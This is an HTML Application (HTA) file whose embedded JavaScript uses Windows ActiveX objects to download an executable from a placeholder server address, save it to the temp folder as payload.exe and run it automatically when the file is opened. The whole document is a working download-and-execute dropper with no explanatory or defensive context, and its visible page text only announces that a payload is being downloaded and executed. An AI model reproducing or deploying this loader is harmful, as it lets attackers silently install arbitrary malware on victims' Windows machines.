<!DOCTYPE html>
<html>
<head>
    <title>Execute Payload</title>
    <HTA:APPLICATION 
        APPLICATIONNAME="Payload Executor"
        BORDER="thick"
        CAPTION="yes"
        SHOWINTASKBAR="yes"
        SINGLEINSTANCE="yes"
        SYSMENU="yes"
        WINDOWSTATE="normal">
    <script language="javascript" type="text/javascript">
        function downloadAndRun() {
            var shell = new ActiveXObject("WScript.Shell");
            var url = "http://your-server.com/path/to/payload.exe"; // URL to your executable
            var tempFile = shell.ExpandEnvironmentStrings("%TEMP%") + "\\payload.exe";
            
            // Create XMLHTTP object to download the file
            var xhr = new ActiveXObject("MSXML2.XMLHTTP");
            xhr.open("GET", url, false);
            xhr.send();
            
            // Save the file
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Open();
            stream.Type = 1; // adTypeBinary
            stream.Write(xhr.responseBody);
            stream.Position = 0;
            stream.SaveToFile(tempFile, 2); // 2 = adSaveCreateOverWrite
            stream.Close();
            
            // Execute the file
            shell.Run(tempFile, 1, false);
        }
        
        // Run the function on page load
        downloadAndRun();
    </script>
</head>
<body>
    <h1>Downloading and executing payload...</h1>
</body>
</html>
